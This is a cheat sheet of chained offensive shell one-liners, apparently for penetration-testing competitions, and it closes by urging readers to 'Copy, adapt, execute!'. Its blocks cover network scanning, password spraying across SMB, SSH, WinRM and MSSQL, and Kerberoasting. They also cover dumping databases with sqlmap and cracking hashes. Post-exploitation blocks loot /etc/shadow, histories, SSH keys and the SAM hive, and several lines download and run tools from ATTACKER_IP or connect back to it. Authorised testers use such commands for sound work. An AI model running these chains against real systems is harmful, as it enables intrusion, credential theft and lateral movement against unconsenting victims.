# One-Liner Command Chains

---

## Network Discovery & Enumeration

### Complete Network Discovery Chain
```bash
# Find live hosts → Port scan → Service enum → Save results
nmap -sn 10.10.10.0/24 -oG - | grep "Up" | cut -d' ' -f2 > targets.txt && \
nmap -iL targets.txt --top-ports 1000 -oA quick_scan && \
nmap -p- -sV -sC -iL targets.txt -oA full_scan &
```

### Start AutoRecon on Everything
```bash
# Scan all targets and background it
autorecon -t targets.txt -o ~/results/ -v 2>&1 | tee autorecon.log &
```

---

## Quick Win Checks

### SNMP Credential Sweep
```bash
# Find SNMP → Test default community → Extract credentials
sudo nmap -sU -p 161 --open 10.10.10.0/24 | grep "Discovered open port" | cut -d' ' -f6 | while read ip; do snmpwalk -v2c -c public $ip | grep -i "password\|credential"; done
```

### Redis No-Auth Check
```bash
# Test all hosts for unauthenticated Redis
for ip in 10.10.10.{1..254}; do redis-cli -h $ip ping 2>/dev/null && echo "$ip - NO AUTH!"; done
```

### Default Credential Spray
```bash
# Test admin:admin across all SMB
netexec smb 10.10.10.0/24 -u admin -p admin --continue-on-success
```

---

## Active Directory

### Complete AD Quick Assessment
```bash
# SMB signing → Kerberoast → AS-REP roast → BloodHound → Start cracking (all in background)
netexec smb DC_IP --gen-relay-list relay.txt && \
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile kerberoast.txt & \
impacket-GetNPUsers DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile asrep.txt & \
bloodhound-python -u USER -p 'PASS' -d DOMAIN -ns DC_IP -c All --zip & \
sleep 60 && hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt & \
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt &
```

### Credential Spray Across All Services
```bash
# Found password? Test EVERYWHERE in one line
PASSWORD="FoundPass123!" && \
netexec smb 10.10.10.0/24 -u admin -p "$PASSWORD" | tee smb_results.txt && \
netexec ssh 10.10.10.0/24 -u admin -p "$PASSWORD" | tee ssh_results.txt && \
netexec winrm 10.10.10.0/24 -u admin -p "$PASSWORD" | tee winrm_results.txt && \
netexec mssql 10.10.10.0/24 -u admin -p "$PASSWORD" | tee mssql_results.txt
```

---

## Web Application

### Complete Web Enumeration Chain
```bash
# Tech fingerprint → Directory enum → Check common files → Start nuclei
whatweb http://TARGET && \
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50 > gobuster.txt & \
curl http://TARGET/robots.txt && curl http://TARGET/.git/config && curl http://TARGET/.env && \
nuclei -u http://TARGET -t ~/nuclei-templates/ &
```

### WordPress Complete Chain
```bash
# Scan → Enumerate users → Try xmlrpc brute force
wpscan --url http://TARGET --enumerate vp,vt,u --api-token TOKEN && \
wpscan --url http://TARGET -U admin -P /usr/share/wordlists/rockyou.txt --max-threads 50
```

---

## Exploitation

### SQL Injection Quick Test Chain
```bash
# Test → Extract DB → Dump users → Crack passwords
curl "http://TARGET/page.php?id=1'" && \
sqlmap -u "http://TARGET/page.php?id=1" --batch --dbs && \
sqlmap -u "http://TARGET/page.php?id=1" -D webapp -T users --dump --batch && \
hashcat -m 0 extracted_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Get Shell → Stabilize → Enumerate
```bash
# After getting reverse shell:
python3 -c 'import pty;pty.spawn("/bin/bash")' && \
export TERM=xterm && \
sudo -l && \
wget http://ATTACKER_IP/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```

---

## Post-Exploitation

### Linux Loot Everything Chain
```bash
# Dump creds → histories → configs → SSH keys
cat /etc/passwd /etc/shadow 2>/dev/null | tee creds.txt && \
cat ~/.bash_history /root/.bash_history 2>/dev/null | tee histories.txt && \
find / -name "*config*" -o -name "*.conf" 2>/dev/null | xargs grep -i password 2>/dev/null | tee configs.txt && \
find / -name "id_rsa" -o -name "*.pem" 2>/dev/null | tee ssh_keys.txt
```

### Windows Loot Everything Chain
```powershell
# Save SAM → SYSTEM → Dump with secretsdump
reg save HKLM\SAM sam.save && reg save HKLM\SYSTEM system.save && exit

# Then on Kali:
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

---

## File Transfer

### Serve Files from Kali + Download on Target
```bash
# On Kali (one terminal):
python3 -m http.server 80

# On Linux target:
wget http://ATTACKER_IP/linpeas.sh && chmod +x linpeas.sh

# On Windows target:
certutil -urlcache -f http://ATTACKER_IP/winPEAS.exe winPEAS.exe
```

---

## Pivoting

### Ligolo-ng Quick Setup
```bash
# On Kali (proxy):
./ligolo-ng_proxy -selfcert &

# On compromised host (agent):
./ligolo-ng_agent -connect ATTACKER_IP:11601 -ignore-cert &

# In ligolo proxy:
session
start
# Now you can access internal network from Kali
```

---

## Competition Speed Chains

### First 30 Seconds on Network
```bash
# Discover → Categorize → Start deep scans → Start AutoRecon
nmap -sn 10.10.10.0/24 -oG - | grep Up | cut -d' ' -f2 > targets.txt && \
echo "Found $(wc -l < targets.txt) hosts" && \
nmap -iL targets.txt --top-ports 1000 -oA quick & \
autorecon -t targets.txt -o ~/results/ &
```

### Quick Win Speed Run (Do immediately while scans run)
```bash
# SNMP → Redis → NFS → Default creds (all in parallel)
(sudo nmap -sU -p 161 --open 10.10.10.0/24 && snmpwalk -v2c -c public TARGET) & \
(redis-cli -h TARGET ping && echo "REDIS NO AUTH") & \
(showmount -e TARGET) & \
(netexec smb 10.10.10.0/24 -u admin -p admin) & \
wait
```

---

## Hash Cracking

### Start All Cracking Jobs
```bash
# NTLM → NTLMv2 → Kerberoast → AS-REP (all background)
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt & \
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt & \
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt & \
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt &
```

### Check All Cracking Results
```bash
# Check progress on all
hashcat -m 1000 ntlm.txt --show && \
hashcat -m 5600 ntlmv2.txt --show && \
hashcat -m 13100 kerberoast.txt --show && \
hashcat -m 18200 asrep.txt --show
```

---

## Credential Testing

### Test One Password Everywhere
```bash
# Single password across all services and all hosts
PASSWORD="Welcome2024!" && \
netexec smb 10.10.10.0/24 -u administrator -p "$PASSWORD" --continue-on-success && \
netexec ssh 10.10.10.0/24 -u root -p "$PASSWORD" --continue-on-success && \
netexec winrm 10.10.10.0/24 -u administrator -p "$PASSWORD" && \
netexec mssql 10.10.10.0/24 -u sa -p "$PASSWORD"
```

### Test One User with Multiple Passwords
```bash
# Common password patterns for one user
for pass in "Welcome2024!" "Password123!" "Summer2024!" "Admin123!"; do
    echo "[*] Trying $pass"
    netexec smb TARGET -u admin -p "$pass"
done
```

---

## Time-Savers

### Multi-Tool Web Enum
```bash
# Run multiple web tools in parallel
(gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php > gobuster.txt) & \
(nikto -h http://TARGET > nikto.txt) & \
(nuclei -u http://TARGET > nuclei.txt) & \
wait && cat gobuster.txt nikto.txt nuclei.txt
```

### Parallel Host Scanning
```bash
# Scan multiple hosts at once
for ip in 10.10.10.{50..60}; do
    (nmap -p- -sV $ip -oA scan_$ip) &
done
wait
```

---

## Emergency Quick Reference

### Got shell, need info FAST
```bash
# Linux:
whoami; id; uname -a; ip a; sudo -l

# Windows:
whoami & whoami /priv & systeminfo | findstr /B /C:"OS Name" & ipconfig
```

### Found creds, test EVERYWHERE
```bash
# One-liner credential spray
PASS="Found123!" && netexec smb 10.10.10.0/24 -u admin -p "$PASS" && netexec ssh 10.10.10.0/24 -u root -p "$PASS" && netexec winrm 10.10.10.0/24 -u admin -p "$PASS"
```

### Need privesc paths NOW
```bash
# Linux:
sudo -l; id; find / -perm -4000 2>/dev/null; getcap -r / 2>/dev/null

# Windows:
whoami /priv | findstr /i "SeImpersonate\|SeAssignPrimaryToken\|SeBackup\|SeRestore\|SeDebug"
```

---

**These one-liners save time by chaining related commands. Modify IPs/credentials as needed. Copy, adapt, execute!** ⚡
